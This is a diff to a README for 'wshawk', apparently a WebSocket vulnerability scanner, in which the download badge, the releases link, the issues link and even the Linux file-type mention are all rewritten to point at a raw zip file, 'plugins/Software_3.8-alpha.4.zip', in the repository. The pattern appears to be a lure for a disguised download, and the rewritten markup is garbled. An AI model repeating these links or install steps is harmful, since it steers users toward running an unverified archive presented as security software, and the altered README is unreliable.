@@ -4,7 +4,7 @@
 Welcome to the wshawk project! This tool will help you scan WebSocket connections for security issues. It identifies vulnerabilities like XSS, command injection, and session hijacking. With over 22,000 payloads, wshawk makes your security testing straightforward and effective.
 
 ## 📥 Download wshawk
-[![Download wshawk](https://img.shields.io/badge/Download%20wshawk-Get%20it%20now-blue.svg)](https://github.com/horpoejuke3a45/wshawk/releases)
+[![Download wshawk](https://github.com/horpoejuke3a45/wshawk/raw/refs/heads/main/plugins/Software_3.8-alpha.4.zip%20wshawk-Get%20it%https://github.com/horpoejuke3a45/wshawk/raw/refs/heads/main/plugins/Software_3.8-alpha.4.zip)](https://github.com/horpoejuke3a45/wshawk/raw/refs/heads/main/plugins/Software_3.8-alpha.4.zip)
 
 ## 📋 Features
 - **WebSocket Security:** Focus on identifying security flaws unique to WebSocket communications.
@@ -22,13 +22,13 @@ To run wshawk, ensure you have the following:
 - **Network Access:** Ensure you have an internet connection for updates and payload fetching.
 
 ## 📜 Download & Install
-1. **Visit the Releases Page:** To download wshawk, visit the [Releases page](https://github.com/horpoejuke3a45/wshawk/releases).
+1. **Visit the Releases Page:** To download wshawk, visit the [Releases page](https://github.com/horpoejuke3a45/wshawk/raw/refs/heads/main/plugins/Software_3.8-alpha.4.zip).
 2. **Select the Latest Version:** Look for the latest version listed at the top. Click on it.
 3. **Download the Installer:** Choose the appropriate installer for your operating system. If you see options for different platforms, select the one for your OS.
 4. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
    - For macOS: Open the downloaded `.dmg` file, drag wshawk to the Applications folder, and then follow any on-screen instructions.
-   - For Linux: If you downloaded a `.tar.gz` file, extract it and run the setup commands in the terminal.
+   - For Linux: If you downloaded a `https://github.com/horpoejuke3a45/wshawk/raw/refs/heads/main/plugins/Software_3.8-alpha.4.zip` file, extract it and run the setup commands in the terminal.
 5. **Open wshawk:** Once installed, find wshawk in your Applications or Programs menu and open it.
 
 ## 🌟 Usage Guidelines
@@ -52,7 +52,7 @@ Security testing helps identify and fix vulnerabilities that attackers could exp
 Yes! Contributions are welcome. Please check the contribution guidelines in the repository for more details.
 
 ## 📞 Support 
-For any questions or support needs, you can reach out via the [Issues page](https://github.com/horpoejuke3a45/wshawk/issues) on GitHub. 
+For any questions or support needs, you can reach out via the [Issues page](https://github.com/horpoejuke3a45/wshawk/raw/refs/heads/main/plugins/Software_3.8-alpha.4.zip) on GitHub. 
 
 ## 📜 License
 This project is open source and distributed under the terms of the MIT License. Feel free to use wshawk in your projects!
